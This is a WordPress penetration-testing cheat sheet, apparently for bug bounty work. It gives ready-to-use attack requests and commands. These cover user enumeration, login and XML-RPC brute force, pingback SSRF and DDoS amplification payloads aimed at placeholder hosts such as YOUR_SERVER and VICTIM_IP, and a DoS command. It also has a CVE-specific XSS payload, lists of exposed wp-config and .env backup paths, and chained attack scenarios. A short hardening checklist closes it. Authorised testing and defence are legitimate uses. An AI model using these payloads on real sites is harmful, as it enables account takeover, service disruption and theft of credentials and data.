## 1. Overview

WordPress is a free, open-source content management system written in PHP, paired with MySQL/MariaDB databases. It features a plugin architecture and template system (Themes), making it highly extensible but also vulnerable when misconfigured or outdated.

**Key Attack Surfaces:**

- Core WordPress installation
- Plugins and themes
- Configuration files
- XML-RPC interface
- REST API endpoints
- Admin authentication

---

## 2. Detection & Reconnaissance

### 🎯 Identifying WordPress Sites

**Visual Indicators:**

- Visit `https://target.com/wp-login.php` (admin login page)
- Check page source for `/wp-content/` links
- Look for meta tags: `<meta name="generator" content="WordPress">`

**Quick Check:**

```bash
curl https://target.com/ | grep 'content="WordPress'
```

### 🔍 Version Detection

**Core WordPress Version:**

```
https://target.com/feed
https://target.com/?feed=rss2
https://target.com/license.txt
```

**Plugin Version Discovery:**

```
https://target.com/wp-content/plugins/PLUGINNAME/readme.txt
https://target.com/wp-content/plugins/PLUGINNAME/readme.TXT
https://target.com/wp-content/plugins/PLUGINNAME/changelog.txt
https://target.com/wp-content/plugins/PLUGINNAME/readme.md
```

**Theme Version Discovery:**

```
https://target.com/wp-content/themes/THEMENAME/style.css
https://target.com/wp-content/themes/THEMENAME/readme.txt
```

**Automated Scanning Tools:**

```bash
# WPScan
wpscan --url https://target.com

# WPProbe
wpprobe scan -u https://target.com/ --mode hybrid
```

---

## 3. Exploitation Methods

### 🚀 User Enumeration

**Method 1: Author Parameter**

```
https://target.com/?author=1
https://target.com/?author=2
```

Look for username in URL redirect or page title.

**Method 2: REST API**

```
https://target.com/wp-json/wp/v2/users
https://target.com/?rest_route=/wp/v2/users
```

**Method 3: Batch Enumeration**

```bash
for i in {1..50}; do 
  curl -s -L -i https://target.com/?author=$i | grep -E -o "Location:.*" | awk -F/ '{print $NF}'
done
```

---

### 🔓 Authentication Attacks

**Standard Login Brute Force:**

```http
POST /wp-login.php HTTP/1.1
Host: target.com

log=admin&pwd=BRUTEFORCE_HERE&wp-submit=Log+In&redirect_to=http%3A%2F%2Ftarget.com%2Fwp-admin%2F&testcookie=1
```

**XML-RPC Brute Force (More Efficient):**

```http
POST /xmlrpc.php HTTP/1.1
Host: target.com

<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>BRUTEFORCE_HERE</value></param>
</params>
</methodCall>
```

---

### 💣 XML-RPC Exploitation

**Detection:**

```
GET /xmlrpc.php
```

Response indicates "POST requests only"

**List Available Methods:**

```http
POST /xmlrpc.php HTTP/1.1
Host: target.com

<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

**Evidence Collection:**

```bash
curl -d '<?xml version="1.0" encoding="iso-8859-1"?><methodCall><methodName>demo.sayHello</methodName><params/></methodCall>' https://target.com/xmlrpc.php
```

**SSRF/Port Scanning via Pingback:**

```xml
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://YOUR_SERVER:PORT</string></value></param>
<param><value><string>https://target.com/valid-blog-post</string></value></param>
</params>
</methodCall>
```

**DDoS Amplification:**

```xml
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://VICTIM_IP:PORT</string></value></param>
<param><value><string>https://target.com/valid-post</string></value></param>
</params>
</methodCall>
```

**Automated Tool:**

```bash
# XML-RPC Scanner
git clone https://github.com/nullfil3/xmlrpc-scan
```

---

### 📂 Information Disclosure

**Sensitive File Discovery:**

```
# Debug Logs
https://target.com/wp-content/debug.log

# Backup Configuration Files
https://target.com/.wp-config.php.swp
https://target.com/wp-config.php.bak
https://target.com/wp-config.php.old
https://target.com/wp-config.php.txt
https://target.com/wp-config.php.save
https://target.com/wp-config.php~
https://target.com/wp-config.inc
https://target.com/wp-config.html

# Other Important Files
https://target.com/license.txt
https://target.com/wp-activate.php
https://target.com/.env
```

**Directory Listing:**

```
https://target.com/wp-content/uploads/
```

---

### 🎯 CVE-Specific Exploits

**CVE-2018-6389: Load Scripts DoS (WordPress < 4.9.3)**

_Detection:_ Visit multiple load-scripts.php URLs with different load parameters to trigger massive JS loading.

_Exploitation:_

```bash
# Using Doser
python3 doser.py -t 999 -g 'https://target.com/wp-admin/load-scripts.php?load=...[long payload]'
```

**CVE-2021-24364: Jannah Theme XSS (< 5.4.4)**

_Payload:_

```
https://target.com/wp-admin/admin-ajax.php?action=tie_get_user_weather&options=%7B%27location%27%3A%27Cairo%27%2C%27units%27%3A%27C%27%2C%27forecast_days%27%3A%275%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ecustom_name%27%3A%27Cairo%27%2C%27animated%27%3A%27true%27%7D
```

---

### ⏰ WP-Cron DoS

**Detection:**

```
GET /wp-cron.php
```

Blank page with 200 status = vulnerable

**Exploitation:**

```bash
python3 doser.py -t 999 -g 'https://target.com/wp-cron.php'
```

---

### 🔗 Registration Abuse

**Check if Registration Enabled:**

```
https://target.com/wp-login.php?action=register
```

**Pro Tip:** Try registering with `@company.tld` email domains for privilege escalation opportunities.

---

## 4. Advanced Attack Chains

### 🎪 High-Impact Scenarios

**Scenario 1: User Enum → XML-RPC Brute Force**

1. Extract usernames via REST API
2. Chain with XML-RPC authentication brute force
3. Amplifies attack efficiency significantly

**Scenario 2: SSRF → Internal Network Mapping**

1. Use XML-RPC pingback for port scanning
2. Map internal services and hosts
3. Pivot to internal vulnerabilities

**Scenario 3: SQL Injection → Password Reset Bypass**

1. Exploit SQLi in vulnerable plugin
2. Request password reset for admin user
3. Access: `https://target.com/wp-login.php?action=rp&key={KEY}&login={USER}`
4. Bypass hash cracking entirely

**Scenario 4: Directory Listing → Sensitive Data Exposure**

1. Find open `/wp-content/uploads/` directory
2. Discover uploaded documents, credentials, backups
3. Extract business-critical information

---

## 5. Plugin & Theme Hunting

### 🔧 Automated Discovery Scripts

**Plugin Scraper:**

```python
from bs4 import BeautifulSoup
import urllib.request as hyperlink
import os

link = hyperlink.urlopen('http://plugins.svn.wordpress.org/')
wordPressSoup = BeautifulSoup(link, 'lxml')
filePath = os.path.dirname(os.path.realpath(__file__))
fileNaming = (filePath + '/scrapedlist.txt')

with open('scrapedlist.txt', 'wt', encoding='utf8') as file:
    for link in wordPressSoup.find_all('a', href=True):
        lnk = link.get('href')
        file.write(lnk.replace("/", "") + '\n')
        print(lnk.replace("/", ""))
```

**Theme Scraper:**

```python
from bs4 import BeautifulSoup
import urllib.request as hyperlink
import os

link = hyperlink.urlopen('http://themes.svn.wordpress.org/')
wordPressSoup = BeautifulSoup(link, 'lxml')
filePath = os.path.dirname(os.path.realpath(__file__))
fileNaming = (filePath + '/scrapedlist.txt')

with open('scrapedlist.txt', 'wt', encoding='utf8') as file:
    for link in wordPressSoup.find_all('a', href=True):
        lnk = link.get('href')
        file.write(lnk.replace("/", "") + '\n')
        print(lnk.replace("/", ""))
```

**Fuzzing:**

```bash
ffuf -w scraped.txt -u https://target.com/wp-content/plugins/FUZZ
ffuf -w scraped.txt -u https://target.com/wp-content/themes/FUZZ
```

**CVE Database:** Once you identify plugin/theme versions, search: [https://wpscan.com](https://wpscan.com)

---

## 6. Bypasses & WAF Evasion

### 🛡️ Cloudflare IP Discovery

**Technique:** Check for exposed origin IPs behind Cloudflare WAF using:

- Historical DNS records
- SSL certificate transparency logs
- WordPress pingback to your server (logs real IP)

**Reference:** [Discover CloudFlare WordPress IP](https://blog.nem.ec/2020/01/22/discover-cloudflare-wordpress-ip/)

---

## 7. Mitigations & Defense

### 🔒 Security Hardening Checklist

**Core Protection:**

- [ ] Keep WordPress core updated
- [ ] Update all plugins/themes regularly
- [ ] Remove unused plugins/themes
- [ ] Use strong, unique passwords
- [ ] Enable 2FA for admin accounts

**Configuration Hardening:**

- [ ] Disable XML-RPC: Add to `.htaccess`

```apache
<Files xmlrpc.php>
order deny,allow
deny from all
</Files>
```

- [ ] Disable user enumeration via REST API
- [ ] Disable directory listing
- [ ] Move `wp-config.php` outside web root
- [ ] Remove `readme.html` and `license.txt`
- [ ] Disable WP-Cron (use system cron instead)
- [ ] Set proper file permissions (644 files, 755 directories)

**Monitoring & Response:**

- [ ] Enable security logging
- [ ] Implement rate limiting
- [ ] Use Web Application Firewall (WAF)
- [ ] Regular security audits
- [ ] Monitor for failed login attempts

---

## 8. Essential Resources

**Tools:**

- [WPScan](https://github.com/wpscanteam/wpscan)
- [WPProbe](https://github.com/Chocapikk/wpprobe)
- [XMLRPC-Scan](https://github.com/nullfil3/xmlrpc-scan)
- [WPXploit](https://github.com/relarizky/wpxploit)
- [Doser](https://github.com/quitten/doser.py)

**Technology Detection:**

- Wappalyzer
- WhatRuns
- BuildWith

**References:**

- [WPScan Vulnerability Database](https://wpscan.com)
- [CVE Details](https://cve.mitre.org)
- [WordPress Security Documentation](https://wordpress.org/support/article/hardening-wordpress/)

---

## 💡 Pro Testing Tips

**Strategic Approach:**

1. **Quick Wins First:** Check for xmlrpc.php, user enumeration, directory listing
2. **Version Check:** Identify outdated core/plugins/themes
3. **Chain Attacks:** Combine low-severity findings for higher impact
4. **Document Everything:** Screenshot, save requests, note versions
5. **Stay Updated:** New vulnerabilities emerge daily - monitor WPScan

**Efficiency Boosters:**

- Run automated scans (WPScan, Burp, Acunetix) in parallel
- Fuzz for `.env` files and backup configs
- Check for registration with company email domains
- Look for archived/backup versions of sensitive files

**Remember:** Individual low-severity bugs (user enum, xmlrpc) become critical when chained together. Show full exploitation paths for maximum impact! 🚀